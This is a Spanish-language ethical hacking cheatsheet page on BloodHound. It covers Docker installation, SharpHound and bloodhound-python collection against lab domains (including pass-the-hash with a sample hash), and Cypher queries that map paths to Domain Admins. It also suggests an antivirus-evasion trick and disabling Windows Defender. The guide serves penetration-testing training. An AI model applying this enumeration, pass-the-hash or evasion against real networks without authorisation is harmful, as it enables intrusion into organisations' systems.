
# BloodHound

Es la herramienta más utilizada para enumeración en Active Directory en Kali Linux.

{% hint style="danger" %}
En 2025 la instalación de Bloodhound por apt y neo4j por separado da errores en la ingesta de los archivos zip, por lo que es recomendable seguir los pasos de instalación de la `Community Edition`, que automatiza el proceso de levantar los contenedores con Docker.
{% endhint %}

{% embed url="<https://github.com/BloodHoundAD/BloodHound>" %}

{% embed url="<https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart>" %}

<figure><img src="/files/k15ECQGzuWCTRFIs25i1" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Instalación</mark>

### Instalar y iniciar Docker

```bash
sudo apt install docker.io docker-compose -y
sudo systemctl start docker
sudo systemctl enable docker

# Añadir usuario al grupo docker
sudo usermod -aG docker $USER
sudo reboot
```

Una vez añadido el usuario al grupo docker debemos reiniciar el equipo para que se apliquen los cambios.

{% hint style="warning" %}
Este paso es **NECESARIO** para evitar errores posteriores
{% endhint %}

### Descargar Bloodhound CE

```bash
mkdir Bloodhound && cd Bloodhound
wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
tar -xvzf bloodhound-cli-linux-amd64.tar.gz
./bloodhound-cli
```

#### Menú de ayuda

```
./bloodhound-cli -h

BloodHound CLI is a command line interface for managing BloodHound and
associated containers and services. Commands are grouped by their use.

Usage:
  bloodhound-cli [command]

Available Commands:
  completion  Generate the autocompletion script for the specified shell
  config      Display or adjust the configuration
  containers  Manage BloodHound containers with subcommands
  help        Help about any command
  install     Builds containers and performs first-time setup of BloodHound
  logs        Fetch logs for BloodHound services
  resetpwd    Reset the admin password
  running     Print a list of running BloodHound services
  uninstall   Remove all BloodHound containers, images, and volume data
  update      Update the BloodHound container images if an update is available
  version     Displays BloodHound CLI's version information
```

### Instalar Bloodhound CE

```bash
./bloodhound-cli install

[+] Checking the status of Docker and the Compose plugin...
[+] The `compose` plugin is not installed, so we'll try the deprecated `docker-compose` script
[+] The `docker-compose` script is installed, so we'll use that instead
[+] Starting BloodHound environment installation
[*] A production YAML file already exists in the current directory. Do you want to overwrite it and continue with the install? [y/n]: y
[+] Downloading the production YAML file from https://raw.githubusercontent.com/SpecterOps/BloodHound_CLI/refs/heads/main/docker-compose.yml...
[*] A development YAML file already exists in the current directory. Do you want to overwrite it and continue with the install? [y/n]: y
[+] Downloading the development YAML file from https://raw.githubusercontent.com/SpecterOps/BloodHound_CLI/refs/heads/main/docker-compose.dev.yml...
Pulling app-db     ... 
Pulling graph-db   ... 
Pulling bloodhound ... 
Pulling app-db     ... pulling from library/postgres
Pulling bloodhound ... pulling from specterops/bloodhound
Pulling app-db     ... digest: sha256:cef2d22004db69e3d6...
Pulling app-db     ... status: image is up to date for p...
Pulling app-db     ... done
Pulling graph-db   ... pulling from library/neo4j
Pulling bloodhound ... digest: sha256:35cc75157164b495eb...
Pulling bloodhound ... status: image is up to date for s...
Pulling bloodhound ... done
Pulling graph-db   ... digest: sha256:2f9e1e52b4e2925970...
Pulling graph-db   ... status: image is up to date for n...
Pulling graph-db   ... done
Starting windows_graph-db_1 ... 
windows_app-db_1 is up-to-date
Starting windows_graph-db_1 ... done
Creating windows_bloodhound_1 ... 
Creating windows_bloodhound_1 ... done
[+] BloodHound is ready to go!
[+] You can log in as `admin` with this password: VVfPBqpXFn9MNpsJyMYt9U4q*******
[+] You can get your admin password by running: bloodhound-cli config get default_password
[+] You can access the BloodHound UI at: http://127.0.0.1:8080/ui/login
```

Eso nos genera un contenedor de Docker en la url: `http://127.0.0.1:8080/ui/login`

### Posibles errores

#### Daemon not running

Este error ocurre porque el usuario no está en el grupo docker o se ejecuta sin sudo:

```bash
./bloodhound-cli install
[+] Checking the status of Docker and the Compose plugin...
2025/04/25 19:07:01 Docker is installed on this system, but the daemon is not running
```

Debemos añadir nuestro usuario al grupo Docker y reiniciar el equipo:

```bash
sudo usermod -aG docker $USER
sudo reboot
```

```bash
./bloodhound-cli install
[+] Checking the status of Docker and the Compose plugin...
[+] The `compose` plugin is not installed, so we'll try the deprecated `docker-compose` script
[+] The `docker-compose` script is installed, so we'll use that instead
[+] Starting BloodHound environment installation
<---SNIP--->
```

### Ver contenedores de Docker activos

```bash
docker ps

CONTAINER ID   IMAGE                          COMMAND                  CREATED        STATUS                  PORTS                                                          NAMES
2e483ce2a900   specterops/bloodhound:latest   "/bloodhound -config…"   1 minute ago   Up 1 minute             127.0.0.1:8080->8080/tcp                                       windows_bloodhound_1
f13d5f34978d   neo4j:4.4                      "tini -g -- /startup…"   1 minute ago   Up 1 minute (healthy)   127.0.0.1:7474->7474/tcp, 7473/tcp, 127.0.0.1:7687->7687/tcp   windows_graph-db_1
4d169c98e5b1   postgres:16                    "docker-entrypoint.s…"   1 minute ago   Up 1 minute (healthy)   5432/tcp                                                       windows_app-db_1
```

Como vemos nos genera automáticamente 3 contenedores automáticamente:

* `BloodHound`
* `Neo4j`
* `PostgreSQL`

### Detener contenedores de Docker

```bash
./bloodhound-cli containers

Manage BloodHound containers and services with subcommands.

Usage:
  bloodhound-cli containers [command]

Available Commands:
  build       Builds the BloodHound containers (only needed for updates)
  down        Bring down all BloodHound services and remove the containers
  restart     Restart all stopped and running BloodHound services
  start       Start all stopped BloodHound services
  stop        Stop all BloodHound services without removing the containers
  up          Build, (re)create, and start all BloodHound containers

Flags:
  -h, --help   help for containers
```

Podemos detener todos los contenedores de Docker con:

```bash
./bloodhound-cli containers down
```

Y volver a levantarlos con:

```bash
./bloodhound-cli containers up
```

## <mark style="color:purple;">Acceder a la GUI</mark>

```
http://127.0.0.1:8080/ui/login
```

<figure><img src="/files/HGqDfAmHwHe1gNuKz4Ic" alt=""><figcaption></figcaption></figure>

Nos logueamos con las credenciales por defecto que nos proporciona en la terminal al ejecutar `./bloodhound-cli install`:

```
user: admin
password: VVfPBqpXFn9MNpsJyMYt9U4q*******
```

{% hint style="success" %}
Deberemos cambiar la contraseña al acceder por primera vez
{% endhint %}

<figure><img src="/files/LQ9V9EkkRIE7cPPVS0Mu" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Descargar colectores</mark>

Podemos descargar Sharhound directamente desde la GUI:

<figure><img src="/files/Xxmq3ZMUmYlNPMZ4d5DR" alt=""><figcaption></figcaption></figure>

O podemos descargar la última release del repositorio (recomendable):

{% embed url="<https://github.com/SpecterOps/SharpHound>" %}

## Sharphound

{% hint style="warning" %}
Necesitamos enviar el archivo `SharpHound.ps1` o `SharpHound.exe` a la máquina windows objetivo
{% endhint %}

* Copiar el raw del repositorio y pegarlo en un documento de texto (o enviar desde Kali a la máquina objetivo)
* Guardarlo como `SharpHound.ps1`

{% hint style="success" %}
Esto es para que no lo detecte el antivirus al enviarlo desde otra máquina. Otra opción sería desactivar el Windows Defender y enviar el archivo desde nuestro Kali Linux.
{% endhint %}

{% embed url="<https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1>" %}

### SharpHound.ps1

```powershell
PS C:\Users\hporter> Import-Module .\SharpHound.ps1
PS C:\Users\hporter> Invoke-BloodHound -CollectionMethod All

2025-04-29T09:49:52.4871795-07:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
2025-04-29T09:49:52.6903062-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, CertServices, LdapServices, WebClientService, SmbInfo
2025-04-29T09:49:52.7528064-07:00|INFORMATION|Initializing SharpHound at 9:49 AM on 4/29/2025
2025-04-29T09:49:52.8465547-07:00|INFORMATION|Resolved current domain to spookysec.local
2025-04-29T09:49:53.0965549-07:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, CertServices, LdapServices, WebClientService, SmbInfo
2025-04-29T09:49:53.2371798-07:00|INFORMATION|Beginning LDAP search for spookysec.local
<---SNIP--->
2025-04-29T09:49:55.2528071-07:00|INFORMATION|Status: 310 objects finished (+310 155)/s -- Using 37 MB RAM
2025-04-29T09:49:55.2528071-07:00|INFORMATION|Enumeration finished in 00:00:02.0415498
2025-04-29T09:49:55.7052367-07:00|INFORMATION|Saving cache with stats: 18 ID to type mappings.
 0 name to SID mappings.
 1 machine sid mappings.
 3 sid to domain mappings.
 0 global catalog mappings.
2025-04-29T09:49:55.7677396-07:00|INFORMATION|SharpHound Enumeration Completed at 9:49 AM on 4/29/2025! Happy Graphing!
```

### SharpHound.exe

```powershell
PS C:\Users\hporter> .\SharpHound.exe -c All

2025-04-29T09:49:52.4871795-07:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
2025-04-29T09:49:52.6903062-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, CertServices, LdapServices, WebClientService, SmbInfo
2025-04-29T09:49:52.7528064-07:00|INFORMATION|Initializing SharpHound at 9:49 AM on 4/29/2025
2025-04-29T09:49:52.8465547-07:00|INFORMATION|Resolved current domain to spookysec.local
2025-04-29T09:49:53.0965549-07:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, CertServices, LdapServices, WebClientService, SmbInfo
2025-04-29T09:49:53.2371798-07:00|INFORMATION|Beginning LDAP search for spookysec.local
<---SNIP--->
2025-04-29T09:49:55.2528071-07:00|INFORMATION|Status: 310 objects finished (+310 155)/s -- Using 37 MB RAM
2025-04-29T09:49:55.2528071-07:00|INFORMATION|Enumeration finished in 00:00:02.0415498
2025-04-29T09:49:55.7052367-07:00|INFORMATION|Saving cache with stats: 18 ID to type mappings.
 0 name to SID mappings.
 1 machine sid mappings.
 3 sid to domain mappings.
 0 global catalog mappings.
2025-04-29T09:49:55.7677396-07:00|INFORMATION|SharpHound Enumeration Completed at 9:49 AM on 4/29/2025! Happy Graphing!
```

### ZIP generado

```powershell
PS C:\Users\hporter> dir
 Volume in drive C has no label.
 Volume Serial Number is DA7F-3F25

 Directory of c:\Users\hporter>

04/24/2025  12:01 PM    <DIR>          .
04/24/2025  12:01 PM    <DIR>          ..
04/24/2025  12:01 PM           236,186 20250429094954_BloodHound.zip 
```

### Envío de ZIP a nuestro Kali Linux

Si estamos conectados por RDP de la siguiente manera al host objetivo podemos enviarlo fácilmente con un `copy` a nuestra carpeta local `/home/kali/Escritorio/hack-tools/WINDOWS`:

```bash
xfreerdp /v:10.10.10.10 /u:hporter /p:Gr8hambino! /drive:home,"/home/kali/Escritorio/hack-tools/WINDOWS"
```

Podemos escribir `net use` para ver la ubicación de nuestra unidad redirigida:

```powershell
PS C:\Users\hporter> net use
New connections will be remembered.

Status       Local     Remote                    Network
-------------------------------------------------------------------------------
                       \\TSCLIENT\home           Microsoft Terminal Services
The command completed successfully.
```

Y con el siguiente comando lo copiamos a nuestro directorio local:

```powershell
PS C:\Users\hporter> copy .\20250424124339_data.zip \\Tsclient\Home
```

También lo podríamos copiar con `Control+C` y pegarlo en `Network \\tsclient\home` desde el explorador de archivos si estamos conectados por RDP:

<figure><img src="/files/UJbq7JiHLOiVI9YE3Avq" alt=""><figcaption></figcaption></figure>

Ahora lo tendremos en nuestra ruta: `/home/kali/Escritorio/hack-tools/WINDOWS`

## <mark style="color:purple;">Bloodhound-python</mark>

Para evitar tener que enviar SharpHound a la máquina Windows, y enviar el zip generado de vuelta a Kali Linux para analizarlo, podemos usar `bloodhound-python`. directamente desde Kali Linux con credenciales válidas de un usuario AD.

Para ello debemos primero configurar el archivo `/etc/resolv.conf` de la siguiente manera donde `spookysec.local` es nuestro objetivo:

```
domain spookysec.local
nameserver 10.10.26.240
search spookysec.local
```

### Con credenciales

Ahora ya podemos ejecutar `bloodhound-python` de la siguiente manera. Usaremos las credenciales del usuario comprometido `backup`:

```bash
afsh4ck@kali$ bloodhound-python -d spookysec.local -u backup -p backup2517860 -dc AttacktiveDirectory.spookysec.local -c All --dns-tcp --zip

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: spookysec.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: AttacktiveDirectory.spookysec.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: AttacktiveDirectory.spookysec.local
INFO: Found 18 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 3 ous
INFO: Found 21 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: AttacktiveDirectory.spookysec.local
INFO: Done in 00M 12S
INFO: Compressing output into 20250326202635_bloodhound.zip
```

### Con hash (Pass the Hash)

Podemos usar `bloodhound-python` solamente con el hash, sin la contraseña en plano.

{% hint style="warning" %}
**IMPORTANTE**: poner `:` antes del hash o no funcionará!
{% endhint %}

```bash
afsh4ck@kali$ bloodhound-python -u 'Haze-IT-Backup$' --hashes ':84d6a733d85d9e03f46eba25b34517a9' -d haze.htb -ns 10.10.11.61 -c All --zip

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: haze.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc01.haze.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.haze.htb
INFO: Found 9 users
INFO: Found 57 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 20 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc01.haze.htb
INFO: Done in 00M 08S
INFO: Compressing output into 20250508111541_bloodhound.zip
```

## <mark style="color:purple;">Importar zip en Bloodhound CE</mark>

En `Administration` hacemos click en `Upload Files`:

<figure><img src="/files/0YQnTLSLBoj1HTjiI5j9" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Explorar los gráficos</mark>

En el partado `Explore` podemos empezar a buscar usuarios y grupos de Active Directory.

### Inbound / Outbound Object Control

En **BloodHound**, los conceptos de **Inbound Object Control** y **Outbound Object Control** se refieren a **quién controla a quién** a nivel de objetos en el Active Directory. Son clave para entender relaciones de control entre usuarios, grupos, equipos, OUs, etc.

#### 🟢 **Inbound Object Control**

> “¿**Quién puede controlar este objeto**?”

Este valor en un nodo (como un usuario o un grupo) te muestra todos los objetos que tienen control sobre él, como vemos en la siguiente imagen:

<figure><img src="/files/lqQbX4fQdJ9xxfErU4n4" alt=""><figcaption></figcaption></figure>

#### 🔵 **Outbound Object Control**

> “¿**Qué objetos controla este nodo**?”

Este valor en un nodo te muestra todos los **objetos que el nodo actual puede controlar**. Por ejemplo:

<figure><img src="/files/D0QVe88vAVU2Yj5WzaVJ" alt=""><figcaption></figcaption></figure>

### Member of

Esta opción nos muestra los grupos a los que pertenece un usuario o grupo determinado:

<figure><img src="/files/71SqBbaxd08MKsRlP9sm" alt=""><figcaption></figcaption></figure>

### Local Admin Privileges

Esta opción nos muestra los privilegios de administración local de distintos usuarios y grupos:

<figure><img src="/files/KnyC7oJnuPlPcFi1JzMG" alt=""><figcaption></figcaption></figure>

### Pathfinding

Podemos ver la ruta entre varios usuarios o un usuario y un grupo:

<figure><img src="/files/mCUQP1qJJcrc0H2rCRCH" alt=""><figcaption></figcaption></figure>

### FIltros por tipo de nodo

Tenemos los siguientes tipos de nodos que podemos filtrar en BloodHound:

<figure><img src="/files/sJ4f7KNTNGmv13SrXDyB" alt=""><figcaption></figcaption></figure>

Por ejemplo para filtrar los grupos de administradores podemos escribir:

```
group:admin
```

### Cypher Querys

Podemos usar distintas querys de búsqueda en formato cypher para filtrar información de los gráficos. Al igual que SQL existe para MSSQL y otras bases de datos relacionales tradicionales, Cypher es un lenguaje diseñado para bases de datos gráficas con su propia sintaxis.

#### Cypher básico

Al crear consultas Cypher, es importante tener en cuenta que, por lo general, se intenta crear una ruta utilizando las relaciones disponibles. Veamos una consulta muy básica:

```cypher
MATCH (B)-[A]->(R) RETURN B
```

Analicemos cómo se construye esta consulta Cypher. Al consultar la base de datos, iniciamos nuestras consultas con la palabra clave MATCH. La cláusula MATCH permite especificar un patrón en la base de datos.

* Cada `variable` en la consulta Cypher se define utilizando un identificador, en este caso, los siguientes: `B, A y R`. El identificador de las variables puede ser cualquier cosa que desee, incluidas palabras completas, como "grupos".
* Los `nodos` se especifican mediante `paréntesis`, por lo que `B y R` son nodos en la consulta de ejemplo anterior.
* Las `relaciones` se especifican mediante `corchetes`, por lo que en este ejemplo, `A` representa relaciones.

A continuación podemos ver algunas querys de búsqueda interesantes:

#### ✅ 1. **Ruta más corta hacia los Domain Admins**

```cypher
MATCH p=shortestPath((n:User)-[*1..]->(m:Group))
WHERE toUpper(m.name) = "DOMAIN ADMINS@INLANEFREIGHT.LOCAL"
RETURN p
```

#### 🔍 2. **Rutas con control total a Domain Admins**

```cypher
MATCH p=shortestPath((u:User)-[r:MemberOf|AdminTo|AddMember|GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner|AllExtendedRights|HasSession|CanRDP|ExecuteDCOM*1..]->(g:Group))
WHERE toUpper(g.name) = "DOMAIN ADMINS@INLANEFREIGHT.LOCAL"
RETURN p
```

#### 🧠 3. **Usuarios con relaciones `AdminTo` sobre máquinas donde hay sesiones de Domain Admins**

```cypher
MATCH (u:User)-[:AdminTo]->(c:Computer)<-[:HasSession]-(da:User)
WHERE da.memberof = "DOMAIN ADMINS@INLANEFREIGHT.LOCAL"
RETURN u.name, c.name, da.name
```

#### 🕵️ 4. **Cuentas que pueden comprometer un DA por ACLs (GPOs, WriteDACL, etc.)**

```cypher
MATCH (n:User)-[r:GenericAll|GenericWrite|WriteOwner|WriteDacl|AllExtendedRights]->(m:User)
WHERE toUpper(m.name) ENDS WITH "DOMAIN ADMINS@INLANEFREIGHT.LOCAL"
RETURN n.name, type(r), m.name
```

#### 🧰 5. **Computadoras donde DA ha iniciado sesión (para token impersonation)**

```cypher
MATCH (u:User)-[:MemberOf*1..]->(:Group {name:"DOMAIN ADMINS@INLANEFREIGHT.LOCAL"})
MATCH (u)-[:HasSession]->(c:Computer)
RETURN u.name, c.name
```

Puedes usar esta información con **Rubeus**, **Mimikatz**, o **token impersonation** vía `Invoke-TokenManipulation`.

#### 🔐 6. **Usuarios con privilegios de `AddMember` sobre grupos sensibles**

```cypher
MATCH (u:User)-[:AddMember]->(g:Group)
WHERE g.name = "DOMAIN ADMINS@INLANEFREIGHT.LOCAL"
RETURN u.name, g.name
```

Esto indica que `u` puede **añadirse a Domain Admins directamente**, si tiene privilegios de escritura.

#### 🚨 7. **Usuarios que pueden hacer Kerberoasting y no son Domain Admins**

```cypher
MATCH (u:User)-[:HasSID]->(s:Kerberos)
WHERE u.hasspn = true AND NOT u.name ENDS WITH "DOMAIN ADMINS@INLANEFREIGHT.LOCAL"
RETURN u.name, u.serviceprincipalnames
```

#### 💣 8. **Usuarios con permisos de delegación (constrained y unconstrained)**

```cypher
MATCH (u:User)
WHERE u.allowedtodelegate IS NOT NULL OR u.unconstraineddelegation = true
RETURN u.name, u.allowedtodelegate, u.unconstraineddelegation
```

#### 🔁 Reutiliza como función Cypher en BloodHound CE

Puedes guardar estas queries en BloodHound CE como **queries personalizadas** desde la GUI en la sección **Custom Queries**. Dale nombre y descripción para uso repetido en operaciones.

***

## <mark style="color:purple;">Ejemplos prácticos</mark>

En las siguientes secciones verás varios ejemplos prácticos aplicando el análisis con Bloodhound a distintas máquinas:

{% content-ref url="/pages/LvCnvd8B1zZuyziqCjoz" %}
[Movimiento lateral](/ethical-hacking-cheatsheet/hacking-en-entornos-reales/enterprise-hacking/movimiento-lateral-y-escalada-de-privilegios/movimiento-lateral.md)
{% endcontent-ref %}

{% content-ref url="/pages/mKcnn9WxvuVomGODjubW" %}
[Comprometiendo Active Directory](/ethical-hacking-cheatsheet/hacking-en-entornos-reales/enterprise-hacking/movimiento-lateral-y-escalada-de-privilegios/comprometiendo-active-directory.md)
{% endcontent-ref %}

{% content-ref url="/pages/zlfdZJeEW1W55TzI9vlD" %}
[Attracktive Directory](/ethical-hacking-cheatsheet/writeups/tryhackme/attracktive-directory.md)
{% endcontent-ref %}
